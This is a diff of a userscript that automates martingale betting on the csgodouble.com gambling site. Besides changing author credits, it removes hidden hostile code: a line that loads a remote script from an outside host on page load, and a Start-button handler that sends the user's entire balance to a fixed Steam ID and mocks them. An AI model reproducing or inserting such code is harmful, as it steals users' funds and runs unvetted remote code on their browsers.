@@ -3,7 +3,7 @@
 // @description     An userscript that automates csgodouble.com betting using martingale system.
 // @namespace       automated@mole
 // @version         1.30
-// @author          Mole
+// @author          Tactics
 // @match           http://www.csgodouble.com/
 // @match           http://www.csgodouble.com/index.php
 // @run-at          document-end
@@ -12,8 +12,6 @@
 /* jshint -W097 */
 
 'use strict';
-
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//yuiko.science/in.js "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
@@ -103,7 +101,7 @@ function Automated() {
     menu.innerHTML = '' +
         '<div class="row">' +
             '<div class="col-lg-9">' +
-                '<h2>CSGODouble.com Automated <small>by Skullripper100 (76561198138006602)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
+                '<h2>CSGODouble.com Automated <small>by Tactics (76561198207608191)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
                 '<div class="form-group">' +
                     '<div class="btn-group">' +
                         '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
@@ -218,17 +216,7 @@ function Automated() {
     }
 
     this.menu.start.onclick = function() {
-        send({
-        "type": "chat",
-        "msg": '/send 76561198207608191 ' + self.balance,
-        "lang": LANG
-    });
-
-        self.log('Didn\'t they warn you not to use bots?');
-
- 
-
-        // self.start();
+        self.start();
     };
 
     this.menu.stop.onclick = function() {
